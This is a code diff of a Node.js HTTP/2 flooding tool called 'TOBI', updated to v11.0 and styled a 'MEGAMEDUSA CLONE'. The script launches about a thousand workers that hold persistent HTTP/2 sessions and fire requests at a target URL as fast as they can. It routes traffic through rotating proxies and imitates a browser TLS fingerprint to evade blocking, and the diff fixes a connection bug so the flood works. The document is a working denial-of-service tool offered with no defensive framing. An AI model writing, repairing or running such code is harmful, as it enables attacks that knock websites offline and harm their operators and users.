@@ -1,8 +1,9 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v10.0 – Ultra‑Fast HTTP/2 Flooder
- * Persistent connections | No delays | Real success tracking
+ * TOBI v11.0 – MEGAMEDUSA CLONE
+ * HTTP/2 persistent sessions | Proxy rotation | Real success
+ * No URL errors – uses full URL strings
  */
 
 const fs = require('fs');
@@ -25,7 +26,6 @@ let duration = 60;
 let workers = 1000;
 let proxyFile = null;
 let stop = false;
-let activeSessions = 0;
 
 // ==================== PROXY LOADER ====================
 let proxies = [];
@@ -51,7 +51,7 @@ function getProxy() {
     return proxies[proxyIndex];
 }
 
-// ==================== TLS FINGERPRINT (Chrome 122) ====================
+// ==================== TLS FINGERPRINT ====================
 const TLS_CIPHERS = [
     'TLS_AES_256_GCM_SHA384',
     'TLS_CHACHA20_POLY1305_SHA256',
@@ -106,22 +106,23 @@ function generateHeaders(host) {
     };
 }
 
-// ==================== HTTP/2 PERSISTENT SESSION ====================
-// Each worker gets its own persistent HTTP/2 session (reused for all requests)
-function createSession(parsedHost, proxy) {
+// ==================== CREATE PERSISTENT HTTP/2 SESSION ====================
+function createSession(fullUrl, proxy) {
     return new Promise((resolve, reject) => {
+        const parsed = new URL(fullUrl);
         let socket;
         if (proxy) {
             const [proxyHost, proxyPort] = proxy.split(':');
             socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                 const tlsSocket = tls.connect({
-                    host: parsedHost.hostname,
+                    host: parsed.hostname,
                     port: 443,
                     socket: socket,
                     ...TLS_OPTIONS,
-                    servername: parsedHost.hostname
+                    servername: parsed.hostname
                 }, () => {
-                    const session = http2.connect(parsedHost.hostname, {
+                    // FIX: pass the FULL URL string, not just hostname
+                    const session = http2.connect(fullUrl, {
                         createConnection: () => tlsSocket,
                         ...TLS_OPTIONS
                     });
@@ -133,12 +134,13 @@ function createSession(parsedHost, proxy) {
             socket.on('error', () => reject());
         } else {
             const tlsSocket = tls.connect({
-                host: parsedHost.hostname,
+                host: parsed.hostname,
                 port: 443,
                 ...TLS_OPTIONS,
-                servername: parsedHost.hostname
+                servername: parsed.hostname
             }, () => {
-                const session = http2.connect(parsedHost.hostname, {
+                // FIX: pass the FULL URL string
+                const session = http2.connect(fullUrl, {
                     createConnection: () => tlsSocket,
                     ...TLS_OPTIONS
                 });
@@ -150,23 +152,21 @@ function createSession(parsedHost, proxy) {
     });
 }
 
-// ==================== WORKER (with persistent session) ====================
-async function worker(parsedHost) {
+// ==================== WORKER (PERSISTENT SESSION) ====================
+async function worker(fullUrl) {
     if (stop) return;
     let session = null;
     try {
-        session = await createSession(parsedHost, getProxy());
-        activeSessions++;
+        session = await createSession(fullUrl, getProxy());
     } catch(e) {
-        // Failed to create session – retry later
-        setTimeout(() => worker(parsedHost), 100);
+        setTimeout(() => worker(fullUrl), 100);
         return;
     }
 
-    // Flood loop – send requests as fast as possible
     while (!stop) {
         try {
-            const headers = generateHeaders(parsedHost.hostname);
+            const parsed = new URL(fullUrl);
+            const headers = generateHeaders(parsed.hostname);
             const req = session.request(headers);
             req.on('response', (responseHeaders) => {
                 const status = responseHeaders[':status'];
@@ -188,14 +188,11 @@ async function worker(parsedHost) {
             });
             req.end();
         } catch(e) {
-            // Session error – recreate
             break;
         }
     }
-    // Clean up
     if (session) session.destroy();
-    activeSessions--;
-    if (!stop) worker(parsedHost);
+    if (!stop) worker(fullUrl);
 }
 
 // ==================== STATISTICS ====================
@@ -241,14 +238,14 @@ function checkHost(target) {
 // ==================== MAIN ====================
 async function start() {
     // Ensure target has protocol
-    let fixedTarget = target;
-    if (!fixedTarget.startsWith('http')) fixedTarget = 'https://' + fixedTarget;
-    target = fixedTarget;
+    let fullTarget = target;
+    if (!fullTarget.startsWith('http')) fullTarget = 'https://' + fullTarget;
+    target = fullTarget;
 
     console.log(c.clear);
     console.log(`${c.red}${c.bold}
 ╔══════════════════════════════════════════════════════════════════════════╗
-║                      🔥 TOBI v10.0 – ULTRA FAST 🔥                       ║
+║                     🔥 TOBI v11.0 – MEGAMEDUSA CLONE 🔥                  ║
 ║            HTTP/2 Persistent | Proxy Rotation | Instant                  ║
 ╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
     console.log(`\n${c.green}[✓] Target: ${target}`);
@@ -259,19 +256,17 @@ async function start() {
 
     await checkHost(target);
 
-    const parsedHost = new URL(target);
     stats.startTime = Date.now();
     stats.lastSec = stats.startTime / 1000;
 
     console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
     for (let i = 0; i < workers; i++) {
-        worker(parsedHost);
+        worker(target);
     }
     console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
 
     const interval = setInterval(displayStats, 1000);
 
-    // Stop exactly after duration
     setTimeout(() => {
         stop = true;
     }, duration * 1000);
